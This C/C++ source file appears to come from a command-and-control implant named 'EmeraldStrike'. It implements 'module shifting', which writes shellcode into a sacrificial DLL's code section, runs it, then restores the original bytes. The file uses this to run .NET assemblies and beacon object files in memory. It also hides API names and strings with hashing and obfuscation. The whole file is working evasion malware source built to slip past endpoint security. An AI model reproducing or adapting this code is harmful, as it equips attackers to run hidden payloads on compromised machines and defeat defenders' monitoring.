/*
    EmeraldStrike - Module Shifting Implementation

    Transient shift-and-restore for fork-and-run bootstrap shellcode.
    Reuses module_stomp.cc's VEH-intercepted sacrifice loader
    (ms_load_sacrifice), writes the bootstrap into the sacrifice's .text
    at the pad offset, executes it in-process, then restores the original
    bytes - the in-process analog of naksyn's ModuleShifting restore step.

    x64 only. Gated by INCLUDE_EVASION_MODULE_SHIFT. This translation unit
    only contributes code when execute_assembly or inline_execute is built.
*/

#include "config.h"
#include "common.h"

#if defined(INCLUDE_CMD_EXECUTE_ASSEMBLY) || defined(INCLUDE_CMD_INLINE_EXECUTE)
#ifdef INCLUDE_EVASION_MODULE_SHIFT
#ifdef _WIN64

#include "evasion/module_shift.h"
#include "evasion/fork_and_run.h"

// Non-VEH sacrifice mapping (LoadLibraryExW DONT_RESOLVE path) - implemented
// in module_stomp.cc. Used instead of ms_load_sacrifice: see module_shift_exec.
BOOL ms_map_sacrifice_ex(PINSTANCE inst, PMODULE_STOMP_CTX ctx, DWORD required);

// ────────────────────────────────────────────────────────────────────
// Shift-and-restore execution of arbitrary PIC shellcode
// ────────────────────────────────────────────────────────────────────

DWORD module_shift_exec(PINSTANCE inst, BYTE* shellcode, DWORD len, PVOID param) {
    DWORD rc = (DWORD)-1;
    if (!shellcode || len == 0 || !inst->Win32.VirtualProtect) return rc;

    // Map a fresh sacrifice WITHOUT the VEH/single-step loader: the shift
    // path never needs DllMain neutered (it does not run at all under
    // DONT_RESOLVE_DLL_REFERENCES), and re-entering the VEH storm a second
    // time - now with the agent's own frames inside a previously-stomped
    // image on the stack - makes the handler's register-scavenging heuristic
    // dereference garbage and take the process down. Deadlock or crash, both
    // observed. The plain mapping path has neither failure mode.
    MODULE_STOMP_CTX sctx;
    es_memset(&sctx, 0, sizeof(sctx));
    if (!ms_map_sacrifice_ex(inst, &sctx, (DWORD)MODULE_SHIFT_PAD + len)) return rc;
    if (sctx.SacText.pBase == nullptr || sctx.SacText.dwVirtualSize < (DWORD)MODULE_SHIFT_PAD + len)
        return rc;

    PBYTE dst = (PBYTE)sctx.SacText.pBase + MODULE_SHIFT_PAD;
    DWORD oldProt = 0;

    // RW, back up the span we overwrite, copy the shellcode in
    inst->Win32.VirtualProtect(sctx.SacText.pBase, sctx.SacText.dwVirtualSize,
                                PAGE_READWRITE, &oldProt);
    DWORD origProt = oldProt;
    BYTE* backup = (BYTE*)es_malloc(inst, len);
    if (!backup) {
        inst->Win32.VirtualProtect(sctx.SacText.pBase, sctx.SacText.dwVirtualSize,
                                    origProt, &oldProt);
        return rc;
    }
    es_memcpy(backup, dst, len);
    es_memcpy(dst, shellcode, len);
    inst->Win32.VirtualProtect(sctx.SacText.pBase, sctx.SacText.dwVirtualSize,
                                origProt, &oldProt);

    // Execute the bootstrap in the shifted section. The bootstrap blocks
    // until done (CLR host / COFF run), then returns here.
    typedef DWORD (*fn_bootstrap)(PVOID);
    fn_bootstrap entry = (fn_bootstrap)dst;
    rc = entry(param);

    // Restore: RW, copy original bytes back, protection back, free backup.
    // We are executing from the agent's own allocation here, so an inline
    // memcpy is safe (unlike the persistent stomp's exit restore).
    inst->Win32.VirtualProtect(sctx.SacText.pBase, sctx.SacText.dwVirtualSize,
                                PAGE_READWRITE, &oldProt);
    es_memcpy(dst, backup, len);
    inst->Win32.VirtualProtect(sctx.SacText.pBase, sctx.SacText.dwVirtualSize,
                                origProt, &oldProt);
    es_free(inst, backup);

    DBG(inst, "[ES] ModuleShift: bootstrap done, section restored");
    return rc;
}

// ────────────────────────────────────────────────────────────────────
// execute_assembly via module shifting
// ────────────────────────────────────────────────────────────────────

BOOL module_shift_run_assembly(PINSTANCE inst,
                               BYTE* asm_data, DWORD asm_len,
                               const char* args_str, DWORD args_len,
                               BYTE** output, DWORD* output_len)
{
#ifdef CLR_BOOTSTRAP_SIZE
    typedef BOOL (WINAPI *fnCP)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
    xstr(_cp, "CreatePipe");
    fnCP pCreatePipe = (fnCP)resolve_function(inst->Modules.Kernel32,
        hash_string_djb2(_cp));
    if (!pCreatePipe) return FALSE;

    HANDLE hR = NULL, hW = NULL;
    SECURITY_ATTRIBUTES sa;
    es_memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    if (!pCreatePipe(&hR, &hW, &sa, 0)) return FALSE;

    // Same data-region layout the fork-and-run path injects remotely:
    // [DWORD asm_len][DWORD args_len][UINT64 pipe_handle][asm][args]
    DWORD data_len = 16 + asm_len + args_len;
    BYTE* data = (BYTE*)es_malloc(inst, data_len);
    if (!data) {
        inst->Win32.CloseHandle(hR);
        inst->Win32.CloseHandle(hW);
        return FALSE;
    }
    *(DWORD*)(data + 0) = asm_len;
    *(DWORD*)(data + 4) = args_len;
    *(UINT64*)(data + 8) = (UINT64)(ULONG_PTR)hW;
    es_memcpy(data + 16, asm_data, asm_len);
    if (args_str && args_len > 0)
        es_memcpy(data + 16 + asm_len, (PVOID)args_str, args_len);

    module_shift_exec(inst, (BYTE*)CLR_BOOTSTRAP_BYTES, CLR_BOOTSTRAP_SIZE, data);
    es_free(inst, data);

    // Drain output. The bootstrap is already done, so no child to wait on -
    // reuse fork_collect_output's drain loop with a NULL process handle
    // (WaitForSingleObject on NULL fails fast; timeout is a safety net).
    FORK_CTX fctx;
    es_memset(&fctx, 0, sizeof(fctx));
    fctx.hPipeRead = hR;
    fctx.hPipeWrite = hW;
    fork_collect_output(inst, &fctx, output, output_len, 1000);
    if (fctx.hPipeRead) inst->Win32.CloseHandle(fctx.hPipeRead);

    return TRUE;
#else
    (void)inst; (void)asm_data; (void)asm_len;
    (void)args_str; (void)args_len; (void)output; (void)output_len;
    return FALSE;
#endif // CLR_BOOTSTRAP_SIZE
}

// ────────────────────────────────────────────────────────────────────
// inline_execute (BOF) via module shifting
// ────────────────────────────────────────────────────────────────────

BOOL module_shift_run_bof(PINSTANCE inst,
                          BYTE* bof_data, DWORD bof_len,
                          BYTE* bof_args, DWORD bof_args_len,
                          BYTE** output, DWORD* output_len)
{
#ifdef BOF_BOOTSTRAP_SIZE
    typedef BOOL (WINAPI *fnCP)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
    xstr(_cp, "CreatePipe");
    fnCP pCreatePipe = (fnCP)resolve_function(inst->Modules.Kernel32,
        hash_string_djb2(_cp));
    if (!pCreatePipe) return FALSE;

    HANDLE hR = NULL, hW = NULL;
    SECURITY_ATTRIBUTES sa;
    es_memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    if (!pCreatePipe(&hR, &hW, &sa, 0)) return FALSE;

    // Same data-region layout the fork-and-run path injects remotely:
    // [DWORD bof_len][DWORD args_len][UINT64 pipe_handle][bof][bof_args]
    DWORD data_len = 16 + bof_len + bof_args_len;
    BYTE* data = (BYTE*)es_malloc(inst, data_len);
    if (!data) {
        inst->Win32.CloseHandle(hR);
        inst->Win32.CloseHandle(hW);
        return FALSE;
    }
    *(DWORD*)(data + 0) = bof_len;
    *(DWORD*)(data + 4) = bof_args_len;
    *(UINT64*)(data + 8) = (UINT64)(ULONG_PTR)hW;
    es_memcpy(data + 16, bof_data, bof_len);
    if (bof_args && bof_args_len > 0)
        es_memcpy(data + 16 + bof_len, bof_args, bof_args_len);

    module_shift_exec(inst, (BYTE*)BOF_BOOTSTRAP_BYTES, BOF_BOOTSTRAP_SIZE, data);
    es_free(inst, data);

    FORK_CTX fctx;
    es_memset(&fctx, 0, sizeof(fctx));
    fctx.hPipeRead = hR;
    fctx.hPipeWrite = hW;
    fork_collect_output(inst, &fctx, output, output_len, 1000);
    if (fctx.hPipeRead) inst->Win32.CloseHandle(fctx.hPipeRead);

    return TRUE;
#else
    (void)inst; (void)bof_data; (void)bof_len;
    (void)bof_args; (void)bof_args_len; (void)output; (void)output_len;
    return FALSE;
#endif // BOF_BOOTSTRAP_SIZE
}

#endif // _WIN64
#endif // INCLUDE_EVASION_MODULE_SHIFT
#endif // INCLUDE_CMD_EXECUTE_ASSEMBLY || INCLUDE_CMD_INLINE_EXECUTE
